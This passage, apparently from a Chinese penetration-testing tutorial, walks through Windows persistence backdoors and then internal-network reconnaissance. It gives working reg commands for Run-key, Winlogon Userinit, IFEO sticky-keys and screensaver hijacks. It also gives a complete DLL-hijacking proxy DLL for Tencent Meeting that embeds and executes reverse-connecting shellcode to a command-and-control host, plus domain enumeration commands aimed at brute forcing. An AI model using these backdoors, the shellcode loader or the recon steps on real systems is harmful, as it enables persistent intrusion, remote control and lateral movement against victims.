HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\currentversion\Runonce
```

![image-20241012161255376](https://image.201068.xyz/assets/38.后渗透/image-20241012161255376.png)

![image-20241012161315660](https://image.201068.xyz/assets/38.后渗透/image-20241012161315660.png)

![image-20241012161348944](https://image.201068.xyz/assets/38.后渗透/image-20241012161348944.png)

![image-20241012161401376](https://image.201068.xyz/assets/38.后渗透/image-20241012161401376.png)

#### 添加注册表运行键

执行以下命令，在注册表运行键中添加一个名为“`houmen`”的键，并将键值指向后门程序的绝对路径

```python
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V houmen /t REG_SZ /d "C:\Users\Administrator\Desktop\6666.exe"

#删除
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V houmen /F
```

![image-20241012161448948](https://image.201068.xyz/assets/38.后渗透/image-20241012161448948.png)

![image-20241012161520555](https://image.201068.xyz/assets/38.后渗透/image-20241012161520555.png)

#### 重启计算机上线

![image-20241012161612280](https://image.201068.xyz/assets/38.后渗透/image-20241012161612280.png)

![image-20241012161737199](https://image.201068.xyz/assets/38.后渗透/image-20241012161737199.png)

### 4.3.Winlogon Helper

Winlogon 是 Windows 系统的组件，用于**处理与用户有关的各种行为**，

如登录.注销.在登录时加载用户配置文件.锁定屏幕等。

这些行为由系统注册表管理，注册表中的一些键值定义了在 Windows 登录期间会启动哪些进程。

我们可以修改此类注册表键值，使 `Winlogon` 在**用户登录时执行恶意程序**，以此建立持久化后门。

#### 常见的两个

```python
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\winlogon

#指定用户登录时执行的用户初始化程序，默认为 explorer.exe
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\winlogon\Shell

#指定Windows身份验证期间执行的程序，默认为 userinit.exe
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
```

![image-20241012161930224](https://image.201068.xyz/assets/38.后渗透/image-20241012161930224.png)

#### 在`Userinit` 键添加个后门序程

执行以下命令，在`Userinit` 键中添加个后门序程，程序将在**用户登录时启动**。

```python
shell reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "C:\Windows\System32\userinit.exe,6666.exe" /f

#恢复
shell reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "C:\Windows\System32\userinit.exe" /f
```

在修改 `Userinit` 和 `Shell` 键时**需要保留键值中的原有程**序，将**要启动的后门程序添加到原有程序后面**，并以“`,`”进行分隔。

并且，**后门程序需要被上传至** `C:\Windows\System32` 目录。

![image-20241012163146494](https://image.201068.xyz/assets/38.后渗透/image-20241012163146494.png)

#### 注销并进行用户登录

![image-20241012163313127](https://image.201068.xyz/assets/38.后渗透/image-20241012163313127.png)

![image-20241012163349494](https://image.201068.xyz/assets/38.后渗透/image-20241012163349494.png)

## 5.IFEO注入(映像劫持)

 `IFEO`(`Image File Execution Options`)是Windows系统的一个注册表项，路径为

```python
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
```

在 Windows 系统中，IFEO 原本是为一些**在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定**。

IFEO 使开发人员能够将**调试器附加到应用程序**。

当进程创建时，应用程序的 IFEO 中设置的调试器将附加到应用程序的名称前，从而有效地在调试器下启动新进程。

![image-20241012164835675](https://image.201068.xyz/assets/38.后渗透/image-20241012164835675.png)

### 5.1.Dubugger

当用户启动计算机的程序后，系统会在注册表的 IFEO 中查询所有的程序子键，

如果存在与该程序名称相同的子健，就读取对应子键的 “`Dubugger`” 键值。

如果该键值未被设置，就默认不做处理，否则**直接用该键值所指定的程序路径来代替原始的程序**。

#### 创建粘滞键后门

通过编辑 “`Dubugger`” 的值，可以通过修改注册表的方式**创建粘滞键后门**。

在目标主机上执行以下命令，向`Image File Execution Options`注册表项中**添加映像劫持子键**，并将“`Dubugger`”的值设置为要执行的程序即可。

```python
shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"

#恢复
shell reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /F
```

![image-20241012165250467](https://image.201068.xyz/assets/38.后渗透/image-20241012165250467.png)

![image-20241012165401961](https://image.201068.xyz/assets/38.后渗透/image-20241012165401961.png)

#### 触发粘滞键

##### 按5次shift

![image-20241012165502169](https://image.201068.xyz/assets/38.后渗透/image-20241012165502169.png)

##### 登录界面按5次shift

![image-20241012165626367](https://image.201068.xyz/assets/38.后渗透/image-20241012165626367.png)

### 5.2.GlobaFlag

  IFEO还可以在指定程序**静默退出时启动任意监控程序**，需要通过设置以下3个注册表来实现。

```python
#启用对记事本进程的静默退出监视
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512

#表示当 notepad.exe 进程退出时，通过调试器进行报告
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1

#将监视器进程设为 6666.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /V Monitorprocess /d "C:\Windows\System32\6666.exe"

#删除
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /F
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /F
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /V Monitorprocess /F
```

![image-20241012165926176](https://image.201068.xyz/assets/38.后渗透/image-20241012165926176.png)

![image-20241012170024451](https://image.201068.xyz/assets/38.后渗透/image-20241012170024451.png)

![image-20241012170102854](https://image.201068.xyz/assets/38.后渗透/image-20241012170102854.png)

#### 记事本退出

![image-20241012170405441](https://image.201068.xyz/assets/38.后渗透/image-20241012170405441.png)

![image-20241012170352400](https://image.201068.xyz/assets/38.后渗透/image-20241012170352400.png)

## 6.利用屏幕保护程序

 屏幕保护是Windows系统的一项功能，可以在用户一段时间**不活动后播放屏幕消息或图形动画**。

屏幕保护程序由具有 `.scr` 文件扩展名的可执行文件组成。

系统注册表项 `HKEY_CURRENT_USER\Control Panel\Desktop` 下存储了用来设置屏幕保护程序的键值。

| 键名                | 说明                                                       |
| ------------------- | ---------------------------------------------------------- |
| SCRNSAVE.EXE        | 设置屏幕保护程序的路径，其指向以 .scr 为扩展名的可执行文件 |
| ScreenSaveActive    | 设置是否启用屏幕保护程序，默认为 1 表示启用                |
| ScreenSaverIsSecure | 设置是否需要密码解锁，设为 0 表示不需要密码                |
| ScreenSaveTimeOut   | 设置执行屏幕保护程序之前用户不活动的超时时间               |

#### 修改屏幕保护程序的执行路径

攻击者可以通过**编辑注册表**，**修改屏幕保护程序的执行路径**（即`scrnsave.exe`键的值），

当**触发屏幕保护**时执行自定义的后门程序，以此实现持久化，具体命令如下。

```python
#将触发屏幕保护时执行的程序设为自定义的恶意程序，这里的程序以.scr或.exe为扩展名皆可
shell reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Users\h\Desktop\6666.exe"

#启用屏幕保护
shell reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /V ScreenSaveActive /t REG_SZ /d 1 /F

#设置不需要密码解锁
shell reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d "0" /F

#将用户不活动的超时设为60秒
shell reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d "5" /F

#删除
reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /F
reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /V ScreenSaveActive /F
reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /F
reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /F
```
![image-20241012174903716](https://image.201068.xyz/assets/38.后渗透/image-20241012174903716.png)

![image-20241012175216521](https://image.201068.xyz/assets/38.后渗透/image-20241012175216521.png)

#### 等待进入屏幕保护程序

注销账户后登录，等待5s

![image-20241012211330558](https://image.201068.xyz/assets/38.后渗透/image-20241012211330558.png)

![image-20241012175820898](https://image.201068.xyz/assets/38.后渗透/image-20241012175820898.png)

## 7.利用 dll 劫持权限维持

 对系统中的软件进行 **dll 劫持**也可达到权限维持的效果，

#### 程序复制到空目录

首先将要劫持的应用程序复制一份到一个空目录当中

https://meeting.tencent.com/download/

![image-20241012213143749](https://image.201068.xyz/assets/38.后渗透/image-20241012213143749.png)

##### 安装腾讯会议

![image-20241012214532286](https://image.201068.xyz/assets/38.后渗透/image-20241012214532286.png)

##### 启动程序放出空白目录

![image-20241012214659318](https://image.201068.xyz/assets/38.后渗透/image-20241012214659318.png)

#### ProcessMonitor 监控程序

利用 `ProcessMonitor` 开启对该程序的监控，

![image-20241012214916584](https://image.201068.xyz/assets/38.后渗透/image-20241012214916584.png)

开启监控后**执行**空目录当中的**软件**，通过 `ProcessMonitor` 查看**进程加载 dll 的情况**，

找到**不在 `Knowndlls` 中的 dll 文件**，

![image-20241012215042550](https://image.201068.xyz/assets/38.后渗透/image-20241012215042550.png)

![image-20241012215411255](https://image.201068.xyz/assets/38.后渗透/image-20241012215411255.png)

#### AheadLib生成 cpp 代码

然后使用 `AheadLib` 生成 cpp 代码。

![image-20241012215725482](https://image.201068.xyz/assets/38.后渗透/image-20241012215725482.png)

![image-20241012215638163](https://image.201068.xyz/assets/38.后渗透/image-20241012215638163.png)

![image-20241012215817880](https://image.201068.xyz/assets/38.后渗透/image-20241012215817880.png)

#### 新建 `dll` 项目

使用 `vs` 新建 `dll` 项目，

![image-20241012215935749](https://image.201068.xyz/assets/38.后渗透/image-20241012215935749.png)

将生成的 cpp 源码粘贴到 vs 中，对代码稍作修改，使其能够运行 shellcode 

![image-20241012220029443](https://image.201068.xyz/assets/38.后渗透/image-20241012220029443.png)

#### 编译成 dll 文件

##### 生成shellcode

![image-20241012222134888](https://image.201068.xyz/assets/38.后渗透/image-20241012222134888.png)

![image-20241012222235814](https://image.201068.xyz/assets/38.后渗透/image-20241012222235814.png)

![image-20241012220921602](https://image.201068.xyz/assets/38.后渗透/image-20241012220921602.png)

![image-20241012222336127](https://image.201068.xyz/assets/38.后渗透/image-20241012222336127.png)

##### 然后将其编译成 dll 文件

```python
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 头文件
#include <Windows.h>
#include "pch.h"
#include <stdlib.h>


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/// 将导出函数复制到下面
#pragma comment(linker, "/EXPORT:GetFileVersionInfoA=versionOrg.GetFileVersionInfoA,@1")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoByHandle=versionOrg.GetFileVersionInfoByHandle,@2")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoExA=versionOrg.GetFileVersionInfoExA,@3")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoExW=versionOrg.GetFileVersionInfoExW,@4")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeA=versionOrg.GetFileVersionInfoSizeA,@5")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeExA=versionOrg.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeExW=versionOrg.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeW=versionOrg.GetFileVersionInfoSizeW,@8")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoW=versionOrg.GetFileVersionInfoW,@9")
#pragma comment(linker, "/EXPORT:VerFindFileA=versionOrg.VerFindFileA,@10")
#pragma comment(linker, "/EXPORT:VerFindFileW=versionOrg.VerFindFileW,@11")
#pragma comment(linker, "/EXPORT:VerInstallFileA=versionOrg.VerInstallFileA,@12")
#pragma comment(linker, "/EXPORT:VerInstallFileW=versionOrg.VerInstallFileW,@13")
#pragma comment(linker, "/EXPORT:VerLanguageNameA=versionOrg.VerLanguageNameA,@14")
#pragma comment(linker, "/EXPORT:VerLanguageNameW=versionOrg.VerLanguageNameW,@15")
#pragma comment(linker, "/EXPORT:VerQueryValueA=versionOrg.VerQueryValueA,@16")
#pragma comment(linker, "/EXPORT:VerQueryValueW=versionOrg.VerQueryValueW,@17")


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// 定义一个名为 DoMagic 的 WINAPI 函数，返回类型为 DWORD，接收一个 LPCVOID 类型的参数  
DWORD WINAPI DoMagic(LPCVOID lpParameter) {
	// 定义一个unsigned char数组，存储shellcode
	unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x0a\x1a\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4b\x4d\x51\x74\x00\xf2\x15\x7c\xe0\x92\xdc\x14\xa3\xa5\x8c\xc7\x2d\x19\xb9\x12\x80\x13\x7c\x09\x39\x26\xf7\x46\xca\x9f\x70\x94\xcb\xa6\x76\xf0\x0e\x63\x9d\x90\xc1\x87\xda\xf7\x77\x11\x60\x42\xcf\x92\xf5\x95\x26\x96\x07\x4f\xb5\xcb\x85\x8e\x53\x5b\xc2\x15\x64\x46\x4a\xf1\xee\xbe\x19\xce\x57\x2a\x68\x78\x03\x83\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x4c\x43\x29\x0d\x0a\x00\x9a\x60\x11\xa4\x00\x71\xb6\x59\x9d\x96\x9f\x13\x53\xa4\x49\x03\x12\x8d\x94\x54\x7f\x8d\x4e\xb3\xbf\x5f\x71\x2e\x24\xb2\xda\x84\x8b\x43\xd9\x2c\x06\x1a\x90\xba\xd3\x03\x46\x4a\xb5\x4b\x4e\x04\xe3\x8d\x83\x72\x47\x86\x08\xd1\x7a\x4d\x82\xe7\xac\x03\xc6\xf0\xd1\xd0\x50\x0e\xba\xb6\x31\x80\x83\xba\xa2\x18\xd8\xc0\x56\xe6\x7f\xa2\x6e\xb0\x6a\xc3\xe3\xfb\xea\x54\x64\x02\x0b\xac\xd1\xb6\x8c\x1b\x11\x90\xa6\x07\x1e\x17\xfe\x60\xe8\x6c\xb1\x00\xe5\x90\xe1\x07\x51\x7e\xa5\xcc\x87\xf2\x3a\xdf\x80\x4f\xb2\x90\xe6\x7a\xcf\xdb\x12\x27\x03\x67\x28\x75\xcf\xba\x5a\x25\xa7\x74\xd5\xf3\x95\xa8\x37\x01\xe1\xce\x73\x2d\x20\xf5\x8b\x37\xa5\xd5\xdf\xa5\x9f\x00\x35\xf5\x57\x37\x5c\x59\x75\x84\x5e\xe0\xf6\x2e\x06\xc3\xcb\xfe\xf6\x99\x28\x19\x61\x8a\x54\x3f\x1f\x41\xb1\x20\x78\xc1\x3e\x13\xd7\x2f\x48\x42\x6a\xc9\xa0\x7a\x22\x16\x50\x77\x99\xbd\xef\x63\x12\x7d\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x37\x30\x2e\x34\x00\x17\x50\x65\xea";
	// 使用 VirtualAlloc 函数在虚拟内存中分配空间，大小为 shellcode 的大小，  MEM_COMMIT 表示立即分配物理内存，PAGE_EXECUTE_READWRITE 表示该内存区域可以执行读写操作 
	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	// 使用memcpy函数将shellcode复制到刚刚分配的内存区域中
	memcpy(exec, shellcode, sizeof shellcode);
	// 将exec强制类型转换为函数指针，并调用该函数（即执行shellcode）
	((void(*)())exec)();
	// 函数返回 0，表示成功执行
	return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// DLL的入口函数，当DLL被加载或卸载时，系统会自动调用此函数
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
	// 判断DLL被加载的原因，DLL_PROCESS_ATTACH 表示DLL被加载到进程中
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		// 禁用DLL_THREAD_ATTACH和DLL_THREAD_DETACH通知，以提高性能
		DisableThreadLibraryCalls(hModule);
		// 创建一个新线程，该线程执行DoMagic函数
		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DoMagic, 0, 0, 0);
		// 检查线程句柄是否有效，即线程是否成功创建
		if (hThread)
		{
			// 如果线程句柄有效，则关闭句柄。这样做是为了防止句柄泄露。闭句柄并不意味着终止线程，线程将继续运行。
			CloseHandle(hThread);
		}
	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{
	}

	return TRUE;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

```

![image-20241012222911835](https://image.201068.xyz/assets/38.后渗透/image-20241012222911835.png)

![image-20241012222839534](https://image.201068.xyz/assets/38.后渗透/image-20241012222839534.png)

![image-20241012223325018](https://image.201068.xyz/assets/38.后渗透/image-20241012223325018.png)

![image-20241012223251794](https://image.201068.xyz/assets/38.后渗透/image-20241012223251794.png)

#### 重命名文件名

编译完成后将其放到空白目录的正常应用程序所在目录，并重命名为被劫持的 **dll 的文件名**，

将**正常 dll 文件**重命名为`AheadLib` 中的**原始文件名称**，

![image-20241012223405312](https://image.201068.xyz/assets/38.后渗透/image-20241012223405312.png)

#### 运行应用程序

当应用程序运行时 cs 即可收到会话。

![image-20241012223444863](https://image.201068.xyz/assets/38.后渗透/image-20241012223444863.png)

![image-20241012223548805](https://image.201068.xyz/assets/38.后渗透/image-20241012223548805.png)

#### 防御系统的 dll 被劫持

Windows 7之后：微软为了更进一步的防御系统的 dll 被劫持，

将一些容易被劫持的系统 dll **写进了一个注册表项**中，

那么凡是此项下的 dll 文件就会**被禁止从﻿EXE﻿自身所在的目录下调用**，而**只能从系统目录即 dll 目录下调用**。

`KnownDLLs` 列表，注册表查询如下：

```bash
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
```

![image-20241012151951852](https://image.201068.xyz/assets/38.后渗透/image-20241012151951852.png)



# 内网信息收集

## 一.内网信息收集

内网信息收集可以从本机信息收集,域内信息收集,内网资源探测等方面进行。

通过内网信息收集，我们可以对当前主机的角色，当前主机所在内网的拓扑结构有整体的了解，从而选择更合适.更精准的渗透方案。

### 1.1 本机基础信息收集

#### 1.1.查看网络配置信息

查看当前主机的网络配置情况，包括主机的 IP 地址，主机名，各网络适配器的信息等，可以从中判断出当前主机所处的内网网段。

```bash
ipconfig /all
```

#### 1.2.查看操作系统信息

查看当前主机的操作系统信息，包括当前主机的主机名,操作系统版本,系统目录,所处的工作站（域或工作组）,安装的补丁信息等。

```bash
systeminfo

#英文系统查看操作系统及版本
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

#中文系统查看操作系统及版本
systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"
```

#### 1.3.查看端口连接信息

查看当前主机的端口连接情况，包括当前主机的 TCP,UDP 等端口监听或开放情况，以及当前主机与网络中其他主机建立的连接情况。

```bash
netstat -aon
```

#### 1.4.查看进程信息

我们可以根据得到的进程列表确定目标主机上本地程序的运行情况。

```bash
tasklist
```

查询主机进程信息，并过滤出进程的路径.名称和 PID。

```bash
wmic process get Name,ProcessId,ExecutablePath

# get：wmic的一个动词，用于从指定的WMI类中检索属性值。
# Name：表示进程的名称。
# ProcessId：表示进程的唯一标识符（PID）。
# ExecutablePath：表示进程的可执行文件的完整路径。
```

查看指定进程的路径信息

```bash
wmic process where Name="进程名称" get ExecutablePath
```

#### 1.5.查看服务信息

查看当前所有服务的信息，并过滤出服务的名称.路径.启动权限.运行状态信息

```bash
wmic service get Caption,Name,PathName,StartName,State

# get：wmic的一个动词，用于从指定的WMI类中检索属性值。
# Caption：服务的简短描述。
# Name：服务的名称。
# PathName：服务可执行文件的完整路径。
# StartName：服务以哪个用户的身份运行。
# State：服务的当前状态。
```

查看指定服务的信息，并过滤出服务名称.路径.和运行状态

```bash
wmic service where Name="服务名称" get Caption,Pathname,State
```

#### 1.6.查看计划任务信息

查看当前主机所有计划任务

```bash
schtasks /query /v /fo list

# /query：查询系统上的计划任务信息。
# /v：显示任务的详细信息。
# /fo list：指定输出格式为列表形式，便于阅读。
```

#### 1.7.查看自启程序信息

查看当前主机上所有的自启程序信息，并过滤出程序名称.所执行的命令.注册表的路径.所属用户

```bash
wmic startup get Caption, Command, Location, User

# startup：WMI中的一个类，代表系统启动时自动运行的项目，通常包括注册表中的启动项和特定的启动文件夹中的程序。
# get：wmic的一个动词，用于从指定的WMI类中检索属性值。
# Caption：启动项的简短描述或名称，通常用于标识启动项。
# Command：启动项要执行的命令或程序的路径，指示系统启动时应运行哪个程序或脚本。
# Location：启动项在注册表或文件系统中的位置，有助于用户或管理员找到并管理启动项。
# User：指定启动项以哪个用户的身份运行，这决定了程序运行时的权限和上下文。
```

#### 1.8.查看系统补丁安装信息

查看当前主机安装的补丁列表，并过滤出补丁链接.名称.描述.补丁编号以及安装时  
 间，我们可以根据目标主机的操作系统版本和缺少的补丁来辅助后面的提权操作。

```bash
wmic qfe get Caption, CSName, Description, HotFixID, Installedon

# qfe：WMI 中的一个类，代表系统上安装的补丁或更新。
# get：wmic 的一个动词，用于从指定的 WMI 类中检索属性值。
# Caption：补丁的简短描述或标题，通常用于标识特定的补丁。
# CSName：计算机系统的名称，指示补丁是安装在哪台计算机上的。
# Description：补丁的详细描述，提供了关于补丁内容,目的等信息。
# HotFixID：补丁的唯一标识符。
# InstalledOn：补丁的安装日期和时间。
```

#### 1.9.查看应用安装信息

查看目标主机上安装的应用软件信息，并过滤出应用的名称和版本。

```bash
wmic product get Caption, Version

# product：WMI 中的一个类，它代表了系统上安装的软件产品。
# get：wmic 的一个动词，用于指定要从 WMI 类中检索哪些属性值。
# Caption：软件的名称或标题，通常用于在系统中唯一标识该软件。
# Version：软件的版本号，指示了软件的特定发行版。
```

#### 1.10.查看本地用户/组信息

```bash
net user	#查看本地用户
net user <username>	#查看指定用户详细信息
net localgroup administrators	#查看本地管理员组
net user <username> <password> /add	#创建本地用户
net localgroup administrators <username> /add	#将用户加入本地管理员组
```

#### 1.11.查看当前登录的用户

查看当前主机登录的用户，对于开启远程桌面服务的Windows主机，若多个用户登录该主机，会产生多个会话。

```bash
query user
```

#### 1.12.查看当前网络共享信息

执行下列命令，查看当前主机开启的共享列表。

```bash
net share
```

#### 1.13.查看已连接的网络共享

执行下列命令，查看当前主机与其他主机建立的网络共享连接

```bash
net use
```

## 二.域内基础信息收集

### 2.1.判断是否存在域环境

查看当前工作站的信息，包括当前计算机名.用户名.系统版本.工作站.登录的域等信息。

```bash
net config workstation
```

### 2.2.查看域用户信息

注意，只有域用户才有权限执行域内查询操作。而计算机本地用户除非提升为本地系统权限，否则只能查询本机信息，无法查询域内信息并提示“拒绝访问"。

```bash
net user /domain	#查看所有的域用户
net user <username> /domain	#查看指定域用户的详细信息
wmic useraccount get Caption,SID,Domain,Description	#获取所有用户的SID,所属域和用户描述信息
```

### 2.3.查看域用户组信息

```bash
net group /domain	#列出域内所有的用户组
net group "Domain Admins" /domain	#查看域管理员组，可以得到所有的域管理员用户
net group "Enterprise Admins" /domain #查看企业系统管理员组，在默认情况下 Domain Admin组和 Enterprise Admins 组中的用户对域内所有主机拥有完全控制权限
net group "Domain Computers" /domain	#查询域成员主机组，可以得到域内所有的客户端主机
```

| 域组名称           | 说明                                         |
| ------------------ | -------------------------------------------- |
| Domain Admins      | 域管理员组，包括所有的域管理员用户           |
| Domain Computers   | 域成员主机组，包括加入域的所有工作站和服务器 |
| Domain Controllers | 域控制器组，包括域中的所有域控制器           |
| Domain Guests      | 域来宾组，包括域中的所有来宾用户             |
| Domain Users       | 域用户组，包括所有域用户                     |


### 2.4.查看域内密码策略

查询域内用户的密码策略，可以根据密码策略构造字典，进行爆破。

```bash
net accounts /domain
```

### 2.5.查看域控列表

查询域控制器组，可以得到所有域控制器的主机名。

```bash
net group "Domain Controllers" /domain
```

### 2.6.查看域控

在域环境中，域控制器会同时被用作时间服务器，使得域中所有计算机的时钟同步。可以通过查询时间服务器来找到主域控制器的名称。

```bash
net time /domain
```

### 2.7.定位域控

知道目标主机的主机名后，可以直接对主机名执行ping命令，根据执行返回的内容即可得知目标主机在内网中的IP地址。

```bash
ping DC.wasj.cn	#DC为域控制器的主机名
```

除此之外，域控制器往往在域内同时会被用作 DNS 服务器，因此找到当前主机的 DNS 服务器地址就可以定位域控。

## 三.内网资源探测

在内网渗透中，我们往往需要通过各种内网扫描技术来探测内网资源的情况，为后续的横向渗透做准备，

通常需要发现内网存活的主机，并探测主机的操作系统，开放了那些端口，端口上运行了哪些服务，服务的当前版本是否存在已知的漏洞等信息，

这些信息可以帮助我们发现内网的薄弱点，确定后续的攻击方向。

### 3.1 基于ICMP发现存活主机

ICMP (Internet Control Message Protocol， 因特网控制消息协议)是TCP/IP协议簇的一个子协议，用于网络层的通信，即IP主机.路由器之间传递控制消息，提供可能发生在通信环境中的各种问题反馈。

通过这些信息，管理员可以对发生的问题做出诊断，然后采取适当的措施解决。

在实际利用中，可以通过 ICMP 循环对整个网段中的每个 IP 地址执行 ping 命令,所有能够 ping 通的 IP 地址即为内网中存活的主机。

```bash
for /L %i in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%i | findstr "TTL="
```

### 3.2 基于NetBIOS协议发现存活主机

NetBIOS (网络基本输入/输出系统)协议

NetBIOS提供 OSI/RM 的会话层(在TCP/IP模型中包含在应用层中)服务，让不同计算机上运行的不同程序可以在局域网中互相连接和共享数据。

